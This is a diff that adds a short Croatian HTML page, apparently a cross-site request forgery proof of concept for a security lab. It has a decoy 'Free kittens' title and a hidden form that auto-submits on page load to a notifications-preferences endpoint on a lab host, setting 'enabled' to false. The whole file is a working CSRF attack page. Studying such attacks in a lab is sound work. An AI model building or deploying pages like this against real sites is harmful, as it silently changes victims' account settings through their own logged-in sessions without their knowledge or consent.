@@ -1,0 +1,12 @@
+<!doctype html>
+<html lang="hr">
+<head><meta charset="utf-8"><title>Besplatne mačkice</title></head>
+<body>
+  <h1>CSRF!</h1>
+  <form id="napad" method="post"
+        action="https://security-lab-z4xt.onrender.com/preferences/notifications">
+    <input type="hidden" name="enabled" value="false">
+  </form>
+  <script>document.getElementById('napad').submit();</script>
+</body>
+</html>
